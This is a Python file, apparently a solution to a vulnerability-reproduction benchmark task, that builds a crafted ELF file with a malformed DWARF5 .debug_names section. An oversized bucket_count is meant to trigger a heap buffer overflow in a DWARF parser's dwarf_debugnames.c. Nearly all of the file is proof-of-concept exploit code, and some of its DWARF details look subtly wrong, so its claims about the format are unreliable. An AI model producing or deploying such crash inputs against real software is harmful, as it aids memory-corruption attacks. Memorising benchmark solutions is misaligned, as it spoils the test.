import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This generates a DWARF5 .debug_names section that triggers the heap buffer overflow
        # The vulnerability is in dwarf_debugnames.c when reading DWARF5 .debug_names section
        # The bug involves miscalculation of limits during name table reading
        
        # We'll create a minimal ELF file with a malformed .debug_names section
        # The key is to create a .debug_names section where the calculated size
        # for reading exceeds the actual allocated buffer
        
        # First, create a minimal ELF64 structure
        elf_header = self._create_elf_header()
        section_headers = self._create_section_headers()
        
        # Create the .debug_names section with malformed data
        debug_names_data = self._create_malformed_debug_names()
        
        # Create .shstrtab section (section name string table)
        shstrtab_data = b'\x00.shstrtab\x00.text\x00.debug_names\x00'
        
        # Calculate offsets
        elf_header_size = 64
        section_header_size = 64
        num_sections = 4  # NULL, .text, .debug_names, .shstrtab
        
        # Update offsets in ELF header
        elf_header = self._update_elf_header(elf_header, 
                                           section_header_offset=elf_header_size,
                                           num_sections=num_sections)
        
        # Create section headers with correct offsets
        text_offset = elf_header_size + (num_sections * section_header_size)
        debug_names_offset = text_offset + 64  # .text section size
        shstrtab_offset = debug_names_offset + len(debug_names_data)
        
        section_headers = self._update_section_headers(section_headers,
                                                      debug_names_offset,
                                                      len(debug_names_data),
                                                      shstrtab_offset,
                                                      len(shstrtab_data))
        
        # Assemble the final ELF
        elf_data = (
            elf_header +
            section_headers +
            b'\x00' * 64 +  # Minimal .text section (64 bytes of zeros)
            debug_names_data +
            shstrtab_data
        )
        
        return elf_data
    
    def _create_elf_header(self):
        """Create a minimal ELF64 header"""
        # ELF magic
        header = b'\x7fELF'  # Magic number
        header += b'\x02'    # 64-bit
        header += b'\x01'    # Little endian
        header += b'\x01'    # ELF version
        header += b'\x00'    # OS ABI (System V)
        header += b'\x00'    # ABI version
        header += b'\x00' * 7  # Padding
        
        # e_type: ET_REL (Relocatable file)
        header += struct.pack('<H', 1)
        # e_machine: EM_X86_64
        header += struct.pack('<H', 62)
        # e_version
        header += struct.pack('<I', 1)
        # e_entry (0 for relocatable)
        header += struct.pack('<Q', 0)
        # e_phoff (0, no program header)
        header += struct.pack('<Q', 0)
        # e_shoff (will be updated later)
        header += struct.pack('<Q', 0)
        # e_flags
        header += struct.pack('<I', 0)
        # e_ehsize
        header += struct.pack('<H', 64)
        # e_phentsize
        header += struct.pack('<H', 0)
        # e_phnum
        header += struct.pack('<H', 0)
        # e_shentsize
        header += struct.pack('<H', 64)
        # e_shnum (will be updated later)
        header += struct.pack('<H', 0)
        # e_shstrndx
        header += struct.pack('<H', 3)  # Index of .shstrtab
        
        return header
    
    def _update_elf_header(self, header, section_header_offset, num_sections):
        """Update ELF header with section header offset and count"""
        header = bytearray(header)
        # Update e_shoff at offset 32
        struct.pack_into('<Q', header, 32, section_header_offset)
        # Update e_shnum at offset 60
        struct.pack_into('<H', header, 60, num_sections)
        return bytes(header)
    
    def _create_section_headers(self):
        """Create initial section headers (will be updated later)"""
        # We'll create 4 section headers: NULL, .text, .debug_names, .shstrtab
        headers = b''
        
        # NULL section header (all zeros)
        headers += b'\x00' * 64
        
        # .text section header template
        headers += b'\x00' * 64
        
        # .debug_names section header template  
        headers += b'\x00' * 64
        
        # .shstrtab section header template
        headers += b'\x00' * 64
        
        return headers
    
    def _update_section_headers(self, headers, debug_names_offset, debug_names_size,
                               shstrtab_offset, shstrtab_size):
        """Update section headers with correct offsets and sizes"""
        headers = bytearray(headers)
        
        # .text section header (index 1)
        # sh_name offset to ".text" in .shstrtab
        struct.pack_into('<I', headers, 64 + 0, 11)  # ".text" starts at offset 11
        # sh_type: SHT_PROGBITS
        struct.pack_into('<I', headers, 64 + 4, 1)
        # sh_flags: SHF_ALLOC | SHF_EXECINSTR
        struct.pack_into('<Q', headers, 64 + 8, 6)
        # sh_addr: 0
        struct.pack_into('<Q', headers, 64 + 16, 0)
        # sh_offset: text section starts after section headers
        text_offset = 64 + (4 * 64)  # ELF header + 4 section headers
        struct.pack_into('<Q', headers, 64 + 24, text_offset)
        # sh_size: 64 bytes
        struct.pack_into('<Q', headers, 64 + 32, 64)
        # sh_link: 0
        struct.pack_into('<I', headers, 64 + 40, 0)
        # sh_info: 0
        struct.pack_into('<I', headers, 64 + 44, 0)
        # sh_addralign: 16
        struct.pack_into('<Q', headers, 64 + 48, 16)
        # sh_entsize: 0
        struct.pack_into('<Q', headers, 64 + 56, 0)
        
        # .debug_names section header (index 2)
        # sh_name offset to ".debug_names" in .shstrtab
        struct.pack_into('<I', headers, 128 + 0, 17)  # ".debug_names" starts at offset 17
        # sh_type: SHT_PROGBITS
        struct.pack_into('<I', headers, 128 + 4, 1)
        # sh_flags: 0
        struct.pack_into('<Q', headers, 128 + 8, 0)
        # sh_addr: 0
        struct.pack_into('<Q', headers, 128 + 16, 0)
        # sh_offset: debug_names_offset
        struct.pack_into('<Q', headers, 128 + 24, debug_names_offset)
        # sh_size: debug_names_size
        struct.pack_into('<Q', headers, 128 + 32, debug_names_size)
        # sh_link: 0
        struct.pack_into('<I', headers, 128 + 40, 0)
        # sh_info: 0
        struct.pack_into('<I', headers, 128 + 44, 0)
        # sh_addralign: 1
        struct.pack_into('<Q', headers, 128 + 48, 1)
        # sh_entsize: 0
        struct.pack_into('<Q', headers, 128 + 56, 0)
        
        # .shstrtab section header (index 3)
        # sh_name offset to ".shstrtab" in .shstrtab
        struct.pack_into('<I', headers, 192 + 0, 1)  # ".shstrtab" starts at offset 1
        # sh_type: SHT_STRTAB
        struct.pack_into('<I', headers, 192 + 4, 3)
        # sh_flags: 0
        struct.pack_into('<Q', headers, 192 + 8, 0)
        # sh_addr: 0
        struct.pack_into('<Q', headers, 192 + 16, 0)
        # sh_offset: shstrtab_offset
        struct.pack_into('<Q', headers, 192 + 24, shstrtab_offset)
        # sh_size: shstrtab_size
        struct.pack_into('<Q', headers, 192 + 32, shstrtab_size)
        # sh_link: 0
        struct.pack_into('<I', headers, 192 + 40, 0)
        # sh_info: 0
        struct.pack_into('<I', headers, 192 + 44, 0)
        # sh_addralign: 1
        struct.pack_into('<Q', headers, 192 + 48, 1)
        # sh_entsize: 0
        struct.pack_into('<Q', headers, 192 + 56, 0)
        
        return bytes(headers)
    
    def _create_malformed_debug_names(self):
        """Create a malformed .debug_names section that triggers the buffer overflow"""
        data = bytearray()
        
        # DWARF5 .debug_names header
        # unit_length (4 bytes, will be filled later)
        data += b'\x00\x00\x00\x00'
        
        # version (2 bytes): DWARF5
        data += struct.pack('<H', 5)
        
        # padding (2 bytes)
        data += b'\x00\x00'
        
        # compilation_unit_count (4 bytes): 0
        data += b'\x00\x00\x00\x00'
        
        # local_type_unit_count (4 bytes): 0
        data += b'\x00\x00\x00\x00'
        
        # foreign_type_unit_count (4 bytes): 0
        data += b'\x00\x00\x00\x00'
        
        # bucket_count (4 bytes): Large value to cause miscalculation
        # This is the key field that triggers the vulnerability
        # The code multiplies this by sizeof(uint32_t) without proper bounds checking
        bucket_count = 0x10000000  # Large value that will cause overflow
        data += struct.pack('<I', bucket_count)
        
        # name_count (4 bytes): 1
        data += struct.pack('<I', 1)
        
        # abbreviation_table_size (4 bytes): Small
        data += struct.pack('<I', 8)
        
        # augmentation_string_size (4 bytes): 0
        data += struct.pack('<I', 0)
        
        # No augmentation string (size is 0)
        
        # Bucket array: bucket_count * 4 bytes
        # We'll write just enough to trigger the overflow
        # The vulnerability occurs when the code tries to read beyond allocated memory
        for i in range(min(1024, bucket_count)):
            data += struct.pack('<I', 0)
        
        # Hash array: name_count * 4 bytes
        data += struct.pack('<I', 0x12345678)
        
        # Name table entries
        # Index entry
        data += struct.pack('<I', 0)  # Index into abbreviation table
        
        # Name: "main" + null terminator
        data += b'main\x00'
        
        # Entry pool
        data += struct.pack('<I', 0)  # DIE offset
        data += struct.pack('<I', 0)  # DIE offset
        
        # Abbreviation table
        # Tag: DW_TAG_subprogram
        data += struct.pack('<B', 0x2e)
        # Has children: no
        data += struct.pack('<B', 0)
        # Attribute: DW_AT_name (string form)
        data += struct.pack('<B', 0x03)
        data += struct.pack('<B', 0x08)  # DW_FORM_string
        # Attribute: DW_AT_decl_file (constant form)
        data += struct.pack('<B', 0x3a)
        data += struct.pack('<B', 0x0d)  # DW_FORM_data1
        # Attribute: DW_AT_decl_line (constant form)
        data += struct.pack('<B', 0x3b)
        data += struct.pack('<B', 0x0d)  # DW_FORM_data1
        # End of attributes
        data += b'\x00\x00'
        
        # Second abbreviation (empty)
        data += b'\x00'
        
        # Update unit_length (excluding the 4 bytes of unit_length itself)
        unit_length = len(data) - 4
        struct.pack_into('<I', data, 0, unit_length)
        
        # Pad to align if needed
        while len(data) % 4 != 0:
            data += b'\x00'
        
        return bytes(data)
